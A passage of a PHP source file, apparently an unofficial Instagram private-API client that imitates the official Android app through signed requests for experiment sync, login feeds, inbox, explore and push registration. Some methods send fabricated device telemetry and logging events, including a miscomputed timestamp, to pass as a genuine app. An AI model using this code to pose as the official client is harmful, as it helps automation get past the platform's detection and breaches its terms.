tilt_to_pan_universe,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_android_direct_expiring_media_from_notification_behavior_universe,ig_android_fbupload_check_status_code_universe,ig_android_offline_reel_feed,ig_android_stories_viewer_modal_activity,ig_android_shopping_creation_flow_onboarding_entry_point,ig_android_activity_feed_click_state,ig_android_direct_expiring_image_quality_universe,ig_android_gl_drawing_marks_after_undo_backing,ig_android_story_gallery_behavior,ig_android_mark_seen_state_on_viewed_impression,ig_android_configurable_retry,ig_android_live_monotonic_pts,ig_android_live_webrtc_livewith_h264_supported_decoders,ig_story_ptr_timeout,ig_android_comment_tweaks_universe,ig_android_location_media_count_exp_ig,ig_android_image_cache_log_mismatch_fetch,ig_android_personalized_feed_universe,ig_android_direct_double_tap_to_like_messages,ig_android_comment_activity_feed_deeplink_to_comments_universe,ig_android_insights_holdout,ig_android_video_render_prevent_cancellation,ig_android_blue_token_conversion_universe,ig_android_tabbed_hashtags_locations_universe,ig_android_sfplt_tombstone,ig_android_live_with_guest_viewer_list_universe,ig_android_explore_chaining_universe,ig_android_gqls_typing_indicator,ig_android_comment_audience_control_universe,ig_android_direct_show_inbox_loading_banner_universe,ig_android_near_bottom_fetch,ig_promote_guided_creation_flow,ig_ads_increase_connection_step2_v2,ig_android_draw_chalk_client_universe'];
			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
			return $this->request('qe/sync/', $postData)[1];
		}
	}

	public function syncUserFeatures()
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'id' => $this->account_id, 'experiments' => 'ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_realtime_mqtt_logging,ig_branded_content_show_settings_universe,ig_android_stories_server_coverframe,ig_android_live_dash_predictive_streaming,ig_android_video_captions_universe,ig_business_growth_acquisition_holdout_17h2,ig_android_ontact_invite_universe,ig_android_ad_async_ads_universe,ig_android_shopping_tag_creation_carousel_universe,ig_feed_engagement_holdout_universe,ig_direct_pending_inbox_memcache,ig_promote_guided_budget_duration_options_universe,ig_android_verified_comments_universe,ig_feed_lockdown,android_instagram_prefetch_suggestions_universe,ig_android_gallery_order_by_date_taken,ig_shopping_viewer_intent_actions,ig_android_startup_prefetch,ig_android_business_post_insights_v3_universe,ig_android_custom_story_import_intent,ig_video_copyright_whitelist,ig_explore_holdout_universe,ig_android_device_language_reset,ig_android_videocall_consumption_universe,ig_android_live_fault_tolerance_universe,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_android_face_filter_glyph_nux_animation_universe,ig_android_direct_allow_consecutive_likes,ig_android_livewith_guest_adaptive_camera_universe,ig_android_business_new_ads_payment_universe,ig_android_audience_control,ig_promotion_insights_sticky_tab_universe,ig_android_unified_bindergroup_in_staticandpagedadapter,ig_android_ad_new_viewability_logging_universe,ig_android_ad_impression_backtest,ig_android_log_account_switch_usable,ig_android_mas_viewer_list_megaphone_universe,ig_android_photo_fbupload_universe,ig_android_carousel_drafts,ig_android_bug_report_version_warning,ig_fbns_push,ig_android_carousel_no_buffer_10_30,ig_android_sso_family_key,ig_android_profile_tabs_redesign_universe,ig_android_user_url_deeplink_fbpage_endpoint,ig_android_fix_slow_rendering,ig_android_hide_post_in_feed,ig_android_shopping_thumbnail_icon,ig_android_ad_watchbrowse_universe,ig_android_search_people_tag_universe,ig_android_codec_high_profile,ig_android_long_impression_tracking,ig_android_inline_appeal,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_android_camera_face_filter_api_retry,ig_video_use_sve_universe,ig_android_low_data_mode,ig_android_enable_zero_rating,ig_android_sample_ppr,ig_android_force_logout_user_with_mismatched_cookie,ig_android_smartisan_app_badging,ig_android_direct_expiring_media_fix_duplicate_thread,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_comments_impression_logger,ig_android_live_encore_production_universe,ig_promote_independent_ctas_universe,ig_android_http_stack_experiment_2017,ig_android_pending_request_search_bar,ig_android_main_feed_carousel_bumping_animation,ig_android_live_thread_delay_for_mute_universe,ig_android_fb_topsearch_sgp_fork_request,ig_android_heap_uploads,ig_android_stories_archive_universe,ig_android_business_ix_fb_autofill_universe,ig_lockdown_feed_shrink_universe,ig_android_stories_create_flow_favorites_tooltip,ig_android_direct_ephemeral_replies_with_context,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_profile_holdout_2017_universe,ig_android_executor_null_queue,ig_android_stories_video_loading_spinner_improvements,ig_android_direct_share_intent,ig_android_live_capture_translucent_navigation_bar,ig_stories_camera_blur_drawable,ig_android_stories_drawing_sticker,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_android_story_decor_image_fbupload_universe,ig_android_comments_ranking_kill_switch_universe,ig_promote_profile_visit_cta_universe,ig_android_story_reactions,ig_android_ppr_main_feed_enhancements,ig_android_used_jpeg_library,ig_carousel_draft_multiselect,ig_android_stories_close_to_left_head,ig_android_video_delay_auto_start,ig_android_live_with_invite_sheet_search_universe,ig_android_stories_archive_calendar,ig_android_ad_watchbrowse_cta_universe,ig_android_ads_manager_pause_resume_ads_universe,ig_android_main_feed_carousel_bumping,ig_stories_in_feed_unit_design_universe,ig_android_explore_iteminfo_universe_exp,ig_android_me_only_universe,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_live_reply_to_comments_universe,ig_android_live_save_to_camera_roll_universe,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_realtime_iris,ig_android_search_client_matching_2,ig_lockdown_notifications_universe,ig_android_feed_seen_state_with_view_info,ig_android_media_rows_prepare_10_31,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_live_auto_collapse_comments_view_universe,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_cache_logger_10_34,ig_android_stories_weblink_creation,ig_android_histogram_reporter,ig_android_network_cancellation,ig_android_shopping_show_shop_tooltip,ig_android_video_delay_auto_start_threshold,ig_android_comment_category_filter_setting_universe,ig_promote_daily_budget_universe,ig_android_stories_camera_enhancements,ig_android_video_use_new_logging_arch,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_feed_stale_check_interval,ig_android_crop_from_inline_gallery_universe,ig_android_direct_reel_options_entry_point,ig_android_stories_gallery_improvements,ig_android_live_broadcaster_invite_universe,ig_android_inline_photos_of_you_universe,ig_android_prefetch_notification_data,ig_android_direct_full_size_gallery_upload_universe_v2,ig_android_direct_app_deeplinking,ig_promotions_unit_in_insights_landing_page,ig_android_reactive_feed_like_count,ig_android_camera_ff_story_open_tray,ig_android_stories_asset_search,ig_android_constrain_image_size_universe,ig_rn_top_posts_stories_nux_universe,ig_ranking_following,ig_android_camera_retain_face_filter,ig_android_direct_inbox_presence,ig_android_live_skin_smooth,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_canvas_swipe_to_open_universe,ig_android_qp_features,android_ig_stories_without_storage_permission_universe2,ig_android_reel_raven_video_segmented_upload_universe,ig_android_swipe_navigation_x_angle_universe,ig_android_invite_xout_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_live_encore_go_live_button_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_live_report_watch_time_when_update,ig_android_family_bridge_discover,ig_android_startup_manager,instagram_search_and_coefficient_holdout,ig_android_high_res_upload_2,ig_android_dynamic_background_prefetch,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_crash_native_core_dumping,ig_android_one_tap_nux_upsell,ig_android_segmentation,ig_profile_holdout_universe,ig_dextricks_module_loading_experiment,ig_android_comments_composer_avatar_universe,ig_android_direct_open_thread_with_expiring_media,ig_android_post_capture_filter,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_no_prefetch_video_bandwidth_threshold,ig_android_encoder_width_safe_multiple_16,ig_android_warm_like_text,ig_android_request_feed_on_back,ig_comments_team_holdout_universe,ig_android_e2e_optimization_universe,ig_shopping_insights,ig_android_direct_async_message_row_building_universe,ig_android_fb_connect_follow_invite_flow,ig_android_direct_24h_replays,ig_android_video_stitch_after_segmenting_universe,ig_android_instavideo_periodic_notif,ig_android_enable_swipe_to_dismiss_for_all_dialogs,ig_android_stories_camera_support_image_keyboard,ig_android_warm_start_fetch_universe,ig_android_marauder_update_frequency,ig_camera_android_aml_face_tracker_model_version_universe,ig_android_ad_connection_manager_universe,ig_android_ad_watchbrowse_carousel_universe,ig_android_branded_content_edit_flow_universe,ig_android_video_feed_universe,ig_android_upload_reliability_universe,ig_android_direct_mutation_manager_universe,ig_android_ad_show_new_bakeoff,ig_heart_with_keyboad_exposed_universe,ig_android_react_native_universe_kill_switch,ig_android_comments_composer_callout_universe,ig_android_search_hash_tag_and_username_universe,ig_android_live_disable_speed_test_ui_timeout_universe,ig_android_miui_notification_badging,ig_android_qp_kill_switch,ig_android_ad_switch_fragment_logging_v2_universe,ig_android_ad_leadgen_single_screen_universe,ig_android_share_to_whatsapp,ig_android_live_snapshot_universe,ig_branded_content_share_to_facebook,ig_android_react_native_email_sms_settings_universe,ig_android_live_join_comment_ui_change,ig_android_camera_tap_smile_icon_to_selfie_universe,ig_android_feed_surface_universe,ig_android_biz_choose_category,ig_android_prominent_live_button_in_camera_universe,ig_android_video_cover_frame_from_original_as_fallback,ig_android_camera_leak_detector_universe,ig_android_live_hide_countdown_universe,ig_android_story_viewer_linear_preloading_count,ig_android_threaded_comments_universe,ig_android_stories_search_reel_mentions_universe,ig_promote_reach_destinations_universe,ig_android_progressive_jpeg_partial_download,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_ff_fill_gap,ig_promote_clicks_estimate_universe,ig_android_video_single_surface,ig_android_video_download_logging,ig_android_foreground_location_collection,ig_android_last_edits,ig_android_pending_actions_serialization,ig_android_post_live_viewer_count_privacy_universe,ig_stories_engagement_2017_h2_holdout_universe,ig_android_image_cache_tweak_for_n,ig_android_direct_increased_notification_priority,ig_android_search_top_search_surface_universe,ig_android_live_dash_latency_manager,instagram_interests_holdout,ig_android_user_detail_endpoint,ig_android_videocall_production_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_video_detail,ig_save_insights,ig_camera_android_new_face_effects_api_universe,ig_comments_typing_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_live_webrtc_audience_expansion_universe,ig_explore_android_universe,ig_android_video_prefetch_for_connectivity_type,ig_android_ad_holdout_watchandmore_universe,ig_promote_default_cta,ig_direct_stories_recipient_picker_button,ig_android_direct_notification_lights,ig_android_insights_relay_modern,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on,ig_android_fb_content_provider_anr_fix,ig_android_in_app_notifications_queue,ig_android_live_follow_from_comments_universe,ig_android_comments_new_like_button_position_universe,ig_android_hyperzoom,ig_android_live_broadcast_blacklist,ig_android_camera_perceived_perf_universe,ig_android_search_clear_layout_universe,ig_promote_reachbar_universe,ig_android_ad_one_pixel_logging_for_reel_universe,ig_android_stories_surface_universe,ig_android_stories_highlights_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_arengine_separate_prepare,ig_android_direct_video_segmented_upload_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_instavideo_remove_nux_comments,ig_android_draw_rainbow_client_universe,ig_android_use_simple_video_player,ig_android_rtc_reshare,ig_android_enable_swipe_to_dismiss_for_favorites_dialogs,ig_android_auto_retry_post_mode,ig_fbns_preload_default,ig_android_emoji_sprite_sheet,ig_android_cover_frame_blacklist,ig_android_gesture_dismiss_reel_viewer,ig_android_gallery_grid_column_count_universe,ig_android_ad_logger_funnel_logging_universe,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_ad_show_new_interest_survey,ig_android_live_encore_reel_chaining_universe,ig_android_vod_abr_universe,ig_android_audience_profile_icon_badge,ig_android_immersive_viewer,ig_android_analytics_use_a2,ig_android_react_native_universe,ig_android_direct_thread_name_as_notification,ig_android_su_rows_preparer,ig_android_leak_detector_universe,ig_android_video_loopcount_int,ig_android_qp_sticky_exposure_universe,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_live_time_adjustment_universe,ig_android_internal_research_settings,ig_android_prod_lockout_universe,ig_android_react_native_ota,ig_android_main_camera_share_to_direct,ig_android_cold_start_feed_request,ig_android_fb_family_navigation_badging_user,ig_stories_music_sticker,ig_android_send_impression_via_real_time,ig_android_sc_ru_ig,ig_android_animation_perf_reporter_timeout,ig_android_warm_headline_text,ig_android_post_live_expanded_comments_view_universe,ig_android_new_block_flow,ig_android_long_form_video,ig_android_sign_video_url,ig_android_image_task_cancel_logic_fix,ig_android_stories_video_prefetch_kb,ig_android_video_render_prevent_cancellation_feed_universe,ig_android_live_stop_broadcast_on_404,android_face_filter_universe,ig_android_render_iframe_interval,ig_business_claim_page_universe,ig_android_live_move_video_with_keyboard_universe,ig_stories_vertical_list,ig_android_stories_server_brushes,ig_android_live_viewers_canned_comments_universe,ig_android_collections_cache,ig_android_payment_settings_universe,ig_android_live_face_filter,ig_android_canvas_preview_universe,ig_android_screen_recording_bugreport_universe,ig_story_camera_reverse_video_experiment,ig_downloadable_modules_experiment,ig_direct_core_holdout_q4_2017,ig_promote_updated_copy_universe,ig_android_search,ig_android_logging_metric_universe,ig_promote_budget_duration_slider_universe,ig_android_insta_video_consumption_titles,ig_android_video_proxy,ig_android_find_loaded_classes,ig_android_direct_expiring_media_replayable,ig_android_reduce_rect_allocation,ig_android_camera_universe,ig_android_post_live_badge_universe,ig_stories_holdout_h2_2017,ig_android_video_server_coverframe,ig_promote_relay_modern,ig_android_search_users_universe,ig_android_video_controls_universe,ig_creation_growth_holdout,android_segmentation_filter_universe,ig_qp_tooltip,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_shopping_profile_shoppable_feed,ig_android_save_collection_pivots,ig_android_business_conversion_value_prop_v2,ig_android_ad_browser_warm_up_improvement_universe,ig_promote_guided_ad_preview_newscreen,ig_android_livewith_universe,ig_android_whatsapp_invite_option,ig_android_video_keep_screen_on,ig_promote_automatic_audience_universe,ig_android_direct_remove_animations,ig_android_live_align_by_2_universe,ig_android_friend_code,ig_android_top_live_profile_pics_universe,ig_android_async_network_tweak_universe_15,ig_android_direct_init_post_launch,ig_android_camera_new_early_show_smile_icon_universe,ig_android_live_go_live_at_viewer_end_screen_universe,ig_android_live_bg_download_face_filter_assets_universe,ig_android_background_reel_fetch,ig_android_insta_video_audio_encoder,ig_android_video_segmented_media_needs_reupload_universe,ig_promote_budget_duration_split_universe,ig_android_upload_prevent_upscale,ig_android_business_ix_universe,ig_android_ad_browser_new_tti_universe,ig_android_self_story_layout,ig_android_business_choose_page_ui_universe,ig_android_camera_face_filter_animation_on_capture,ig_android_rtl,ig_android_comment_inline_expansion_universe,ig_android_live_request_to_join_production_universe,ig_android_share_spinner,ig_android_video_resize_operation,ig_android_stories_eyedropper_color_picker,ig_android_disable_explore_prefetch,ig_android_universe_reel_video_production,ig_android_react_native_push_settings_refactor_universe,ig_android_power_metrics,ig_android_sfplt,ig_android_story_resharing_universe,ig_android_direct_inbox_search,ig_android_direct_share_story_to_facebook,ig_android_exoplayer_creation_flow,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_direct_visual_replies_fifty_fifty,ig_android_reel_viewer_data_buffer_size,ig_android_video_segmented_upload_multi_thread_universe,ig_android_react_native_restart_after_error_universe,ig_android_direct_notification_actions,ig_android_profile,ig_android_additional_contact_in_nux,ig_stories_selfie_sticker,ig_android_live_use_rtc_upload_universe,ig_android_story_reactions_producer_holdout,ig_android_stories_reply_composer_redesign,ig_android_story_viewer_segments_bar_universe,ig_explore_netego,ig_android_audience_control_sharecut_universe,ig_android_direct_fix_top_of_thread_scrolling,ig_video_holdout_h2_2017,ig_android_insights_metrics_graph_universe,ig_android_ad_swipe_up_threshold_universe,ig_android_one_tap_send_sheet_universe,ig_android_international_add_payment_flow_universe,ig_android_live_see_fewer_videos_like_this_universe,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_android_direct_inbox_suggestions,ig_android_video_segmented_upload_universe,ig_carousel_post_creation_tag_universe,ig_android_mqtt_region_hint_universe,ig_android_suggest_password_reset_on_oneclick_login,ig_android_live_special_codec_size_list,ig_android_continuous_contact_uploading,ig_android_story_viewer_item_duration_universe,ig_promote_budget_duration_client_server_switch,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,promote_media_picker,ig_android_live_video_reactions_creation_universe,ig_android_sidecar_gallery_universe,ig_android_business_id,ig_android_story_import_intent,ig_android_feed_follow_button_redesign,ig_android_section_based_recipient_list_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_live_webrtc_livewith_params,ig_android_comment_audience_control_group_selection_universe,android_ig_fbns_kill_switch,ig_android_su_card_view_preparer_qe,ig_android_unified_camera_universe,ig_android_all_videoplayback_persisting_sound,ig_android_live_pause_upload,ig_android_branded_content_brand_remove_self,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_camera_video_universe,ig_android_2fac,ig_android_audio_segment_report_info,ig_android_scroll_main_feed,ig_direct_bypass_group_size_limit_universe,ig_android_story_captured_media_recovery,ig_android_skywalker_live_event_start_end,ig_android_comment_hint_text_universe,ig_android_direct_search_story_recipients_universe,ig_android_ad_browser_gesture_control,ig_android_grid_cell_count,ig_promote_marketing_funnel_universe,ig_android_immersive_viewer_ufi_footer,ig_android_ad_watchinstall_universe,ig_android_comments_notifications_universe,ig_android_shortcuts,ig_android_new_optic,ig_android_audience_control_nux,favorites_home_inline_adding,ig_android_canvas_tilt_to_pan_universe,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_android_direct_expiring_media_from_notification_behavior_universe,ig_android_fbupload_check_status_code_universe,ig_android_offline_reel_feed,ig_android_stories_viewer_modal_activity,ig_android_shopping_creation_flow_onboarding_entry_point,ig_android_activity_feed_click_state,ig_android_direct_expiring_image_quality_universe,ig_android_gl_drawing_marks_after_undo_backing,ig_android_story_gallery_behavior,ig_android_mark_seen_state_on_viewed_impression,ig_android_configurable_retry,ig_android_live_monotonic_pts,ig_android_live_webrtc_livewith_h264_supported_decoders,ig_story_ptr_timeout,ig_android_comment_tweaks_universe,ig_android_location_media_count_exp_ig,ig_android_image_cache_log_mismatch_fetch,ig_android_personalized_feed_universe,ig_android_direct_double_tap_to_like_messages,ig_android_comment_activity_feed_deeplink_to_comments_universe,ig_android_insights_holdout,ig_android_video_render_prevent_cancellation,ig_android_blue_token_conversion_universe,ig_android_tabbed_hashtags_locations_universe,ig_android_sfplt_tombstone,ig_android_live_with_guest_viewer_list_universe,ig_android_explore_chaining_universe,ig_android_gqls_typing_indicator,ig_android_comment_audience_control_universe,ig_android_direct_show_inbox_loading_banner_universe,ig_android_near_bottom_fetch,ig_promote_guided_creation_flow,ig_ads_increase_connection_step2_v2,ig_android_draw_chalk_client_universe'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		$this->settings->set('last_experiments', time());
		$this->settings->save();
		return $this->request('qe/sync/', $postData)[1];
	}

	public function readMsisdnHeader($export = false)
	{
		$requestPosts = ['mobile_subno_usage' => 'default', 'device_id' => $this->uuid];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));

		if ($export) {
			return ['url' => 'https://b.i.instagram.com/api/v1/accounts/read_msisdn_header/', 'data' => $postData];
		}

		return $this->request('https://b.i.instagram.com/api/v1/accounts/read_msisdn_header/', $postData, true, true, false, true)[1];
	}

	public function getPrefillCandidates($export = false)
	{
		$requestPosts = ['android_device_id' => $this->device_id, 'client_contact_points' => '[{"type":"phone","value":"","source":"sim"}]', 'usages' => '["account_recovery_omnibox"]', 'device_id' => $this->uuid];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));

		if ($export) {
			return ['url' => 'https://b.i.instagram.com/api/v1/accounts/get_prefill_candidates/', 'data' => $postData];
		}

		return $this->request('https://b.i.instagram.com/api/v1/accounts/get_prefill_candidates/', $postData, true, true, false, true)[1];
	}

	public function getLoginReelsTrayFeed()
	{
		$requestPosts = ['_uuid' => $this->uuid, '_csrftoken' => $this->token];
		return $this->request('feed/reels_tray/', $requestPosts, true)[1];
	}

	public function getLoginTimelineFeed()
	{
		$addHeader = true;
		$requestPosts = ['_csrftoken' => $this->token, '_uuid' => $this->uuid, 'is_prefetch' => '0', 'phone_id' => $this->phone_id, 'battery_level' => '100', 'is_charging' => '1', 'will_sound_on' => '1', 'is_on_screen' => 'true', 'timezone_offset' => date('Z'), 'is_async_ads' => 'true', 'is_async_ads_double_request' => 'false', 'is_async_ads_rti' => 'false', 'reason' => 'cold_start_fetch', 'is_pull_to_refresh' => '0'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('feed/timeline/', $postData, true, $addHeader)[1];
	}

	public function accountsContactPointPrefill()
	{
		$requestPosts = ['phone_id' => $this->phone_id, '_csrftoken' => $this->token, 'usage' => 'prefill'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('accounts/contact_point_prefill/', $postData, true, true, false, true)[1];
	}

	public function launcherSync($token = false, $export = false)
	{
		if ($token) {
			$requestPosts = ['_csrftoken' => $this->token, 'id' => $this->uuid, 'configs' => ''];
		} else {
			$requestPosts = ['id' => $this->uuid, 'configs' => ''];
		}

		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));

		if ($export) {
			return ['url' => 'https://b.i.instagram.com/api/v1/launcher/sync/', 'data' => $postData];
		}

		return $this->request('launcher/sync/', $postData, true, false, false, true)[1];
	}

	public function feedReelsTray()
	{
		$requestPosts = [
			'_csrftoken' => $this->token,
			'_uid'       => $this->account_id,
			'_uuid'      => $this->uuid,
			'user_ids'   => [$this->account_id]
		];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('feed/reels_media/', $postData, true)[1];
	}

	public function zrToken($export = false)
	{
		$postData = [];
		$url = 'zr/token/result/?device_id=' . $this->device_id . '&token_hash=&custom_device_id=' . $this->uuid . '&fetch_reason=token_expired';

		if ($export) {
			return ['url' => 'https://b.i.instagram.com/api/v1/' . $url, 'data' => $postData];
		}

		return $this->requestFetchZR('https://b.i.instagram.com/api/v1/' . $url, $postData, true, true, false, true)[1];
	}

	public function siFetch($export = false)
	{
		$postData = [];
		$url = 'si/fetch_headers/?challenge_type=signup&guid=' . $this->uuid;
		return $this->requestFetchZR($url, $postData, true)[1];
	}

	public function logAttribution($export = false)
	{
		$requestPosts = ['adid' => $this->adid];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));

		if ($export) {
			return ['url' => 'https://b.i.instagram.com/api/v1/attribution/log_attribution/', 'data' => $postData];
		}

		return $this->request('https://b.i.instagram.com/api/v1/attribution/log_attribution/', $postData, true, true, false, true)[1];
	}

	public function msisdnHeader($export = false)
	{
		$requestPosts = ['mobile_subno_usage' => 'ig_select_app', 'device_id' => $this->uuid];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));

		if ($export) {
			return ['url' => 'https://b.i.instagram.com/api/v1/accounts/msisdn_header_bootstrap/', 'data' => $postData];
		}

		return $this->request('https://b.i.instagram.com/api/v1/accounts/msisdn_header_bootstrap/', $postData, true, true, false, true)[1];
	}

	public function sendLoggingEvent()
	{
		$TimeHack = time() * 86400;
		$data = '{"seq":0,"app_id":"567067343352427","app_ver":"42.0.0.19.95","build_num":"117303963","device_id":"' . $this->device_id . '","family_device_id":"' . $this->device_id . '","session_id":"' . $this->uuid . '","uid":"0","channel":"regular","data":[{"name":"ig_time_taken_for_qe_sync","time":"' . $TimeHack . '.787","extra":{"time_taken":108773,"pk":"0","release_channel":"beta","radio_type":"wifi-none"}},{"name":"instagram_device_ids","time":"' . $TimeHack . '.944","extra":{"app_device_id":"' . $this->device_id . '","analytics_device_id":"' . $this->device_id . '","pk":"0","release_channel":"beta","radio_type":"wifi-none"}},{"name":"ig_time_taken_to_create_main_activity","time":"' . $TimeHack . '.021","extra":{"time_taken":' . $TimeHack . ',"pk":"0","release_channel":"beta","radio_type":"wifi-none"}},{"name":"step_view_loaded","time":"' . $TimeHack . '.262","module":"waterfall_log_in","extra":{"waterfall_id":"' . $this->uuid . '","start_time":' . $TimeHack . ',"current_time":' . $TimeHack . ',"elapsed_time":111796,"step":"landing","os_version":25,"guid":"' . $this->uuid . '","fb_lite_installed":false,"messenger_installed":false,"messenger_lite_installed":false,"whatsapp_installed":false,"pk":"0","release_channel":"beta","radio_type":"wifi-none"}},{"name":"hsite_related_request_skipped","time":"' . $TimeHack . '.263","module":"waterfall_log_in","extra":{"waterfall_id":"' . $this->uuid . '","start_time":' . $TimeHack . ',"current_time":' . $TimeHack . ',"elapsed_time":111798,"os_version":25,"fb_family_device_id":"' . $this->device_id . '","guid":"' . $this->uuid . '","target":"hsite_bootstrap","reason":"connected_to_wifi","pk":"0","release_channel":"beta","radio_type":"wifi-none"}},{"name":"landing_created","time":"' . $TimeHack . '.265","module":"waterfall_log_in","extra":{"waterfall_id":"' . $this->uuid . '","start_time":' . $TimeHack . ',"current_time":' . $TimeHack . ',"elapsed_time":111800,"os_version":25,"fb_family_device_id":"' . $this->device_id . '","guid":"' . $this->uuid . '","step":"landing","funnel_name":"landing","did_log_in":false,"did_facebook_sso":false,"fb4a_installed":false,"network_type":"WIFI","guid":"' . $this->uuid . '","device_lang":"fr_FR","app_lang":"fr_FR","pk":"0","release_channel":"beta","radio_type":"wifi-none"}},{"name":"send_phone_id_request","time":"' . $TimeHack . '.265","module":"waterfall_log_in","extra":{"waterfall_id":"' . $this->uuid . '","start_time":' . $TimeHack . ',"current_time":' . $TimeHack . ',"elapsed_time":111800,"os_version":25,"fb_family_device_id":"' . $this->device_id . '","guid":"' . $this->uuid . '","prefill_type":"both","pk":"0","release_channel":"beta","radio_type":"wifi-none"}},{"name":"ig_active_interval","time":"' . $TimeHack . '.281","extra":{"event_type":"user_session_unknown","start_time":' . $TimeHack . ',"end_time":0,"pk":"0","release_channel":"beta","radio_type":"wifi-none"}},{"name":"connection_change","time":"' . $TimeHack . '.289","module":"device","extra":{"state":"CONNECTED","connection":"WIFI","connection_subtype":"","pk":"0","release_channel":"beta","radio_type":"wifi-none"}}],"log_type":"client_event"}';
		$post = 'message=' . $data . '&format=json';
		return $this->request('https://graph.instagram.com/logging_client_events', $post, true)[1];
	}

	public function getBootstrapUsers()
	{
		$surfaces = ['coefficient_direct_recipients_ranking_variant_2', 'coefficient_direct_recipients_ranking', 'coefficient_ios_section_test_bootstrap_ranking', 'autocomplete_user_list'];
		$requestPosts = ['surfaces' => json_encode($surfaces)];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('scores/bootstrap/users/', $postData, true)[1];
	}

	public function registerPushChannels()
	{
		$requestPosts = [
			'device_type'          => 'android_mqtt',
			'is_main_push_channel' => 'true',
			'phone_id'             => $this->phone_id,
			'device_token'         => [
				'k' => ['pn' => 'com.instagram.android', 'di' => $this->device_id, 'ai' => rand(500010203415052.0, 599910203415052.0), 'ck' => rand(500099056730793.0, 599999056730793.0)],
				'v' => 0,
				't' => ''
			],
			'_csrftoken'           => $this->token,
			'guid'                 => $this->uuid,
			'_uuid'                => $this->uuid,
			'users'                => $this->account_id
		];
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('push/register/', $postData, true, false, false, true)[1];
	}

	public function getLoginRankedRecipients($mode, $showThreads, $query = NULL)
	{
		$requestPosts = ['mode' => $mode, 'show_threads' => $showThreads ? 'true' : 'false', 'use_unified_inbox' => 'true'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('direct_v2/ranked_recipients/', $postData, true)[1];
	}

	public function getInbox()
	{
		$requestPosts = ['visual_message_return_type' => 'unseen', 'persistentBadging' => 'true', 'use_unified_inbox' => 'true'];
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('direct_v2/inbox/?', $postData)[1];
	}

	public function getExploreFeed($maxId = NULL, $isPrefetch = false)
	{
		$requestPosts = ['is_prefetch' => $isPrefetch, 'is_from_promote' => false, 'timezone_offset' => date('Z'), 'session_id' => Signatures::generateUUID(true)];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('discover/explore/', $postData, true)[1];
	}

	public function getFacebookOTA()
	{
